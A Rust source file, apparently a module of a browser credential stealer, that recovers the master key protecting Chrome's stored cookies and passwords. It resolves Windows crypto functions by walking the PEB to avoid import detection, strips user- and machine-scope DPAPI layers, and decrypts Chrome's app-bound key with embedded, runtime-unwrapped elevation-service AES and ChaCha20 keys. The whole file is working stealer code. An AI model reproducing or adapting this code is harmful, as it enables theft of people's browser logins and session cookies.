use std::mem;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;

mod dpflbck_keys {
    include!(concat!(env!("OUT_DIR"), "/dpflbck_keys.rs"));
}

fn get_aes_elev_key() -> [u8; 32] {
    dpflbck_keys::unwrap_key32(
        dpflbck_keys::AES_ELEV_KEY_CT,
        &dpflbck_keys::AES_ELEV_WRAP_KEY,
        &dpflbck_keys::AES_ELEV_WRAP_NONCE,
    )
}

fn get_chacha_elev_key() -> [u8; 32] {
    dpflbck_keys::unwrap_key32(
        dpflbck_keys::CHACHA_ELEV_KEY_CT,
        &dpflbck_keys::CHACHA_ELEV_WRAP_KEY,
        &dpflbck_keys::CHACHA_ELEV_WRAP_NONCE,
    )
}

use crate::peb;

#[repr(C)]
struct CRYPT_INTEGER_BLOB {
    cbData: u32,
    pbData: *mut u8,
}

type CryptUnprotectDataFn = unsafe extern "system" fn(
    *mut CRYPT_INTEGER_BLOB,
    *mut *mut u16,
    *mut CRYPT_INTEGER_BLOB,
    *mut u8,
    *mut u8,
    u32,
    *mut CRYPT_INTEGER_BLOB,
) -> i32;

type LocalFreeFn = unsafe extern "system" fn(*mut u8) -> *mut u8;

fn get_crypt_unprotect_data() -> Option<CryptUnprotectDataFn> {
    let crypt32 = peb::get_module_base("crypt32.dll")?;
    let addr = peb::resolve_export(crypt32, "CryptUnprotectData")?;
    Some(unsafe { mem::transmute(addr) })
}

fn get_local_free() -> Option<LocalFreeFn> {
    let kernel32 = peb::get_module_base("kernel32.dll")?;
    let addr = peb::resolve_export(kernel32, "LocalFree")?;
    Some(unsafe { mem::transmute(addr) })
}

fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    let crypt_unprotect_data = get_crypt_unprotect_data()?;
    let local_free = get_local_free()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if crypt_unprotect_data(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            flags | CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        ) != 0
        {
            let slice =
                std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            local_free(output.pbData as *mut u8);
            Some(slice)
        } else {
            None
        }
    }
}

fn normalize_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() == 32 {
        return Some(data.to_vec());
    }
    if data.len() > 32 {
        let tail = &data[data.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    parse_structured_key(data)
}

fn parse_structured_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 8 {
        return None;
    }
    let val_len = u32::from_le_bytes(data[0..4].try_into().ok()?) as usize;
    let mut offset = 4 + val_len;
    if data.len() < offset + 4 {
        return None;
    }
    let key_len = u32::from_le_bytes(data[offset..offset + 4].try_into().ok()?) as usize;
    offset += 4;
    if key_len == 32 && data.len() >= offset + 32 {
        return Some(data[offset..offset + 32].to_vec());
    }
    None
}

fn aes_gcm_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    cipher.decrypt(Nonce::from_slice(iv), ciphertext).ok()
}

fn chacha20_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    for i in 0..data.len().saturating_sub(61) {
        let flag = data[i];
        if flag != 0x01 && flag != 0x02 && flag != 0x03 {
            continue;
        }
        let iv = &data[i + 1..i + 13];
        let ct_start = i + 13;
        if data.len() < ct_start + 48 {
            continue;
        }
        let ciphertext = &data[ct_start..ct_start + 32];
        let tag = &data[ct_start + 32..ct_start + 48];
        let mut payload = ciphertext.to_vec();
        payload.extend_from_slice(tag);

        let aes_key   = get_aes_elev_key();
        let chacha_key = get_chacha_elev_key();
        let pt = match flag {
            0x01 => aes_gcm_decrypt(&aes_key, iv, &payload),
            0x02 => chacha20_decrypt(&chacha_key, iv, &payload),
            _ => continue,
        };
        if let Some(key) = pt.filter(|k| k.len() == 32) {
            return Some(key);
        }
    }
    None
}

fn extract_master_key(data: &[u8]) -> Option<Vec<u8>> {
    normalize_key(data).or_else(|| chrome_inner_decrypt(data))
}

fn unwrap_dpapi_layers(blob: &[u8]) -> Option<Vec<u8>> {
    let attempts: &[(u32, bool)] = &[
        (0, false),
        (CRYPTPROTECT_LOCAL_MACHINE, true),
    ];

    for &(outer_flags, needs_inner) in attempts {
        if let Some(outer) = dpapi_decrypt(blob, outer_flags) {
            if let Some(key) = extract_master_key(&outer) {
                return Some(key);
            }
            if needs_inner {
                if let Some(inner) = dpapi_decrypt(&outer, 0) {
                    if let Some(key) = extract_master_key(&inner) {
                        return Some(key);
                    }
                }
            }
        }
    }

    if let Some(direct) = dpapi_decrypt(blob, 0) {
        if let Some(key) = extract_master_key(&direct) {
            return Some(key);
        }
    }

    None
}

pub fn try_decrypt_app_bound(encrypted: &[u8]) -> Option<Vec<u8>> {
    unwrap_dpapi_layers(encrypted).and_then(|k| {
        if k.len() == 32 {
            Some(k)
        } else {
            normalize_key(&k)
        }
    })
}

#[allow(dead_code)]
fn _ensure_send() {
    let _ = mem::size_of::<CRYPT_INTEGER_BLOB>();
}
